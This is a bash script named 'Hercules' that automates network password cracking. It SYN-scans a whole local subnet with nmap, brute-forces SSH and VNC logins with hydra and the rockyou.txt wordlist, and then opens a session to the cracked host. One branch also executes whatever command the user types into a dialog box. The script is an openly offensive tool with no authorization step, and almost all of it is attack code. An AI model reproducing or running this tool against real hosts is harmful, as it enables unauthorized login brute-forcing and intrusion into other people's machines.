#!/bin/bash

# Define colors for console output
GREEN='\033[0;32m'
NC='\033[0m' # No Color

# URL to check internet connectivity
SITE="https://google.com/"

# Root user
root=0

# OS type to check
OSTYPE="linux"

# User and hostname prompts
userName="Input Username:"
hostName="Input Hostname:"

# Exit options
exit=("exit" "quit" "EXIT" "QUIT" "STOP" "stop")

# Get current time in 12-hour format
CURRENT_TIME=$(date +"%I:%M:%S %p")

# Get current date in mm/dd/yyyy format
CURRENT_DATE=$(date +"%m/%d/%Y")

# Required packages
required_packages=("wget" "nmap" "hydra")

# Function to check if a command exists
command_exists() {
    command -v "$1" >/dev/null 2>&1
}

# Check for required packages
for package in "${required_packages[@]}"; do
    if ! command_exists "$package"; then
        echo -e "ERROR: The required package ${GREEN}'$package'${NC} is not installed. Please install it and try again."
        exit 1
    fi
done

# Check if the script is run with --help or -h
if [ "$1" = "--help" ] || [ "$1" = "-h" ]; then
    # Display help information
    figlet "? HELP ?"
    zenity --info \
    --title="? HELP ?" \
    --text="+++++++++++++++Programs used+++++++++++++++
This program will help you perform password cracking.
It utilizes two programs: Hydra and Nmap." \
    --width=400

    zenity --info \
    --title="? HELP ?" \
    --text="+++++++++++++++How to use++++++++++++++++++
To use the program, specify the port you want to scan (e.g., SSH - 22, VNC - 5900, MySQL - 3306).
If you want to scan all ports, type 'ALL'.
To stop the program, type 'stop'." \
    --width=400
else
    # Check the operating system type
    if [[ "$OSTYPE" == "${OS}"* ]]; then
        # Check if running as root
        if [[ $EUID -ne $root ]]; then
            title="NOT ROOT"
            message="TIME:${CURRENT_TIME} Please run as root. DATE:${CURRENT_DATE}"
            # Error message if not running as root
            echo "ERROR:TIME:${CURRENT_TIME} Please run as root. DATE:${CURRENT_DATE}" >> ERROR.LOG
            zenity --error --title="${title}" --text="${message}"
            exit
        else
            # Check internet connectivity
            wget -q --spider "${SITE}"
            
            # If connected to the internet, proceed
            if [[ $? -eq 0 ]]; then
                clear
            else
                offlineTitle="offline"
                offline="TIME:${CURRENT_TIME} You are offline. Please connect to the internet. DATE:${CURRENT_DATE}"
                zenity --warning --title="${offlineTitle}" --text="${offline}"
                exit 1
            fi
            clear

            # Function to select a port for scanning
            Hercules() {
                figlet -f slant "Hercules"

                options_text="Type the number of the port you want to scan (SSH - 22, VNC - 5900, MySQL - 3306). To scan all, type 'ALL'. If you want to stop the program, type 'stop'."

                service=$(zenity --entry --title "Hercules" --text "$options_text" --entry-text "")
                
                if [[ " ${exit[*]} " == *" ${service} "* ]]; then
                    zenity --info --title "Hercules" --text "Stopping program."
                    exit 1
                fi
                
                echo -e "[+]The port you are scanning is: ${service}"
                
                if [[ "$service" == "ALL" || "$service" == "all" ]]; then
                    zenity --info --title "Hercules" --text "Scanning all ports. This may take up to 1 hour to complete." --timeout=5
                    
                    # Perform Nmap scan on all ports
                    sudo nmap -sS 192.168.1.1/24 -Pn -oN scan.txt --open
                    
                    # Prompt user to run Hydra and input parameters
                    zenity --info --title "INFO" --text "Put in Hydra first to start the script." --timeout=5
                    hydraInputField="Put in Hydra first to start the script." 
                    GUI_HYDRA=$(zenity --entry --title "hydra" --text "$hydraInputField" --entry-text "")

                    if [[ " ${exit[*]} " == *" ${hydra} "* ]]; then
                        zenity --info --title "Hercules" --text "Stopping program."
                        exit 1
                    else
                        $GUI_HYDRA
                        exit 1
                    fi
                elif [[ "${service}" == "" ]]; then
                    zenity --error --title "ERROR" --text "Please input a number into the input field."
                    Hercules
                else
                    zenity --info --title "Hercules" --text "Scanning port ${service}." --timeout=5
                    sudo nmap -sS 192.168.1.1/24 -p $service --open
                fi
            }

            # Function to capture username and hostname
            RunHackingCommand() {
                zenity --info --title="Hacking command" --text="To crack VNC(5900), don't type anything in the 'Input Username' prompt.
To crack MySQL(3306), type 'localhost' in the 'Input Hostname' prompt"
                user=$(zenity --entry --title "UserName" --text "$userName" --entry-text "")
                host=$(zenity --entry --title "HostName" --text "$hostName" --entry-text "")
            }

            # Function to run Hydra for VNC
            RunHackingCommandWithVNC() {
                if [[ $service == 5900 || $service == "VNC" ]]; then
                    if [[ $user == "" && $host == "" || $host == "" ]]; then
                        zenity --info --title="SERVICE" --text="No service specified"
                        Hercules
                    else
                        # Crack VNC password
                        hydra -P rockyou.txt -t 64 -vV -o output.log -I vnc://$host
                        
                        title="Connecting to ${host}"
                        Connecting_To_VNC_SERVER="We are connecting you to '${host}'. Please wait..."
                        zenity --info --title="${title}" --text="${Connecting_To_VNC_SERVER}"

                        sleep 5

                        title="Enter password to ${host}"
                        Connected_To_VNC_SERVER="We have connected you to '${host}'. Please enter the password to '${host}'. To continue..."
                        zenity --info --title="${title}" --text="${Connected_To_VNC_SERVER}"

                        xtightvncviewer "${host}"
                        exit 1
                    fi
                fi
            }

            # Function to run Hydra for SSH
            RunHackingCommandWithSSH() {
                if [[ $service == 22 || $service == "SSH" ]]; then
                    if [[ $user == "" && $host == "" || $user == "" || $host == "" ]]; then
                        zenity --info --title="SERVICE" --text="No service specified"
                        Hercules
                    else
                        # Crack SSH passwords
                        hydra -l $user -P rockyou.txt -t 64 -vV -o output.log -I ssh://$host
                        
                        title="Connecting to ${user}"
                        Connecting_To_SSH_SERVER="We are connecting you to ${user}. Please wait..."
                        zenity --info --title="${title}" --text="${Connecting_To_SSH_SERVER}"
                        
                        sleep 5

                        title="Enter password to ${user}"
                        Connected_To_SSH_SERVER="We have connected you to ${user}. Please enter the password to ${user} to continue..."
                        zenity --info --title="${title}" --text="${Connected_To_SSH_SERVER}"

                        ssh $user@$host
                    fi
                fi
            }

            # Call functions
            Hercules
            RunHackingCommand
            RunHackingCommandWithVNC
            RunHackingCommandWithSSH
        fi
    else
        clear
        # Warning message for wrong OS
        echo "WARNING:TIME:$CURRENT_TIME Wrong OS. Please use the correct OS. DATE:$CURRENT_DATE" >> ERROR.LOG
        zenity --warning --title="WRONG OS" --text="TIME:$CURRENT_TIME Wrong OS. Please use the correct OS. DATE:$CURRENT_DATE"
    fi
fi
